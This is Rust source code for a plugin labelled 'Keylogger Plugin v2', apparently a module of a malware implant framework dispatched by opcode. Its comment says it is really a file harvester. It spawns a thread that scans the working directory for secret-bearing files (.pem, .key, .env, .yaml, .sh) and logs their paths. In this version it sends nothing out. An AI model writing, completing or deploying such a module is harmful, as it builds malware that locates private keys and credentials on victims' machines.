use plugin_api::HostContext;
use log::info;

/// Keylogger Plugin Implementation
pub struct KeyloggerPlugin {
    buffer_size: usize,
}

impl KeyloggerPlugin {
    pub fn new() -> Self {
        Self { buffer_size: 4096 }
    }

    pub fn opcode(&self) -> u8 {
        0x07
    }

    pub fn execute(&self, _cmd: &[u8], _ctx: &HostContext) -> Result<(), String> {
        // "Keylogger" -> actually a File Harvester for this iteration
        info!("plugin(keylogger): Starting logic... scavenging interesting files.");
        
        std::thread::spawn(move || {
            let interesting_exts = [".pem", ".key", ".sh", ".yaml", ".env"];
            if let Ok(entries) = std::fs::read_dir(".") {
                 for entry in entries.flatten() {
                      if let Ok(path) = entry.path().into_os_string().into_string() {
                           for ext in &interesting_exts {
                               if path.ends_with(ext) {
                                   info!("plugin(keylogger): Found interesting file: {}", path);
                               }
                           }
                      }
                 }
            }
        });
        Ok(())
    }
}

plugin_api::declare_plugin!(KeyloggerPlugin, "Keylogger Plugin v2");
